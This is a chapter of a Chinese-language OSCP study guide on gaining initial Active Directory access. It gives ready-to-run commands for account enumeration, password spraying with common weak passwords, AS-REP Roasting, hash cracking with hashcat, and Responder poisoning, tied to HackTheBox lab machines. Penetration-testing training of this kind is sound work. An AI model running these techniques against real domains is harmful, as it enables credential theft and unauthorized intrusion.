# Ch 31 — 初始立足：Password Spray / AS-REP Roasting

> 目標：在 AD 環境中，從無認證的狀態取得第一個有效的域帳號憑證。

## AD 初始立足的挑戰

進入 AD 環境後，你通常**還沒有任何帳號**。你要從零開始找到一個有效的 Domain User 憑證，才能做後續的 Kerberoasting、BloodHound 等操作。

常見路徑：
```
1. Password Spray（常見弱密碼對所有帳號試）
2. AS-REP Roasting（找不需要預認證的帳號）
3. LLMNR/NBT-NS Poisoning（Responder，中間人）
4. Null Session（舊 AD 的匿名查詢）
5. CVE 利用（Zerologon 等）
```

## 先枚舉使用者清單

要 spray，先要有帳號名單。

### 方法一：kerbrute 枚舉

kerbrute 用 Kerberos 協定枚舉有效帳號（不需要密碼，不觸發帳號鎖定）：

```bash
# 安裝 kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O ~/tools/kerbrute
chmod +x ~/tools/kerbrute

# 枚舉有效帳號
~/tools/kerbrute userenum \
    -d corp.local \
    --dc 10.10.10.x \
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    -t 50

# 輸出：
# VALID USERNAME: alice@corp.local
# VALID USERNAME: bob@corp.local
# VALID USERNAME: svc-sql@corp.local
```

### 方法二：enum4linux / rpcclient

```bash
# 如果 Null Session 可用（舊 AD）
enum4linux -U 10.10.10.x    # 只列使用者

rpcclient -U "" -N 10.10.10.x
rpcclient> enumdomusers
rpcclient> querydispinfo
```

### 方法三：從 SMB / LDAP 枚舉

```bash
# CrackMapExec
crackmapexec smb 10.10.10.x --users
crackmapexec smb 10.10.10.x -u '' -p '' --users   # Null session

# ldapsearch（Null Bind）
ldapsearch -x -H ldap://10.10.10.x -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

## Password Spray

**規則：一次用一個密碼對所有帳號試。** 不要一個帳號試多個密碼，會觸發鎖定。

### 常見 Spray 密碼清單

```
CompanyName2023, CompanyName2024
Password1, Password123, Welcome1
Summer2023, Fall2023, Winter2024
<公司縮寫>@123
```

也可以從 OSINT 找公司相關資訊推測密碼。

### kerbrute spray

```bash
~/tools/kerbrute passwordspray \
    -d corp.local \
    --dc 10.10.10.x \
    users.txt \
    'Password123'
```

### CrackMapExec spray

```bash
crackmapexec smb 10.10.10.x -u users.txt -p 'Password123' --no-bruteforce --continue-on-success

# 成功找到：
# [+] corp.local\alice:Password123 (Pwn3d!) ← 這個帳號有管理員，用 !
# [+] corp.local\bob:Password123
```

## AS-REP Roasting

### 原理

Kerberos 預認證（Pre-Authentication）預設是必須的：你要先用密碼 hash 加密時間戳，DC 才給你 TGT。

但有些帳號設定了「**不需要 Kerberos 預認證**」（`DONT_REQ_PREAUTH`）。對這類帳號，你不需要知道密碼就能請求 AS-REP，而 AS-REP 的一部分是用帳號密碼 hash 加密的。

把 AS-REP 帶回來離線破解 → 得到密碼。

### 找有 DONT_REQ_PREAUTH 的帳號

```bash
# 用 impacket
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
    corp.local/ \
    -usersfile users.txt \
    -dc-ip 10.10.10.x \
    -no-pass \
    -format hashcat

# 也可以不指定使用者（LDAP Null Bind，舊 AD）
python3 GetNPUsers.py corp.local/ -dc-ip 10.10.10.x -no-pass -request

# 輸出（找到 AS-REP hash）：
$krb5asrep$23$svc-backup@CORP.LOCAL:AAAA....BBBB
```

### 破解 AS-REP Hash

```bash
# 存到檔案
echo "$krb5asrep$23$svc-backup@CORP.LOCAL:AAAA...BBBB" > asrep.txt

# Hashcat 破解
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 用 PowerShell 在已有 shell 的情況下

```powershell
# 如果已在 Domain 內
Import-Module .\Rubeus.exe
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## LLMNR/NBT-NS Poisoning（Responder）

### 原理

Windows 在找不到主機名時，會發出 LLMNR/NBT-NS 廣播。你用 Responder 偽裝成目標，讓受害者向你認證，捕獲 Net-NTLMv2 hash。

```bash
# 啟動 Responder（監聽所有廣播）
sudo responder -I tun0 -dwPv

# 等待受害者發出廣播（可能要等）
# 或故意觸發：設法讓使用者訪問一個不存在的主機

# 拿到：
# [SMB] NTLMv2-SSP Hash : user::CORP:abcdefg:1234abcd...
```

破解：

```bash
echo "user::CORP:abcdefg:1234abcd..." > ntlmv2.txt
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

**注意**：考試環境可能不允許 Responder（影響其他候選人），用 OSCP 規定確認。

## 用拿到的憑證做什麼

一旦有了域帳號（哪怕是普通用戶），就能：

```bash
# 確認帳號有效
crackmapexec smb 10.10.10.x -u alice -p 'Password123'

# 枚舉 AD 資訊
crackmapexec smb 10.10.10.x -u alice -p 'Password123' --users --groups --shares

# 跑 BloodHound 收集器（Ch 33）
python3 bloodhound.py -u alice -p 'Password123' -d corp.local -dc dc.corp.local -c all

# Kerberoasting（Ch 32）
python3 GetUserSPNs.py corp.local/alice:'Password123' -dc-ip 10.10.10.x -request
```

## 本章對應靶機

| 機器 | AD 初始技術 |
|------|-----------|
| HTB Forest | AS-REP Roasting（發現 svc-alfresco 無需預認證） |
| HTB Active | Kerberoasting（GPP 密碼 → Kerberoasting） |
| HTB Resolute | Password Spray（預設 Welcome1! 密碼） |

## 自我檢核

- [ ] 能用 kerbrute 枚舉 AD 有效帳號
- [ ] 能用 impacket GetNPUsers.py 找 AS-REP Roastable 帳號
- [ ] 能用 hashcat -m 18200 破解 AS-REP hash
- [ ] 知道 Password Spray 和暴力破解的差別（避免鎖定帳號）

→ [Ch 32 Kerberoasting：服務票證離線破解](./32-kerberoasting.md)
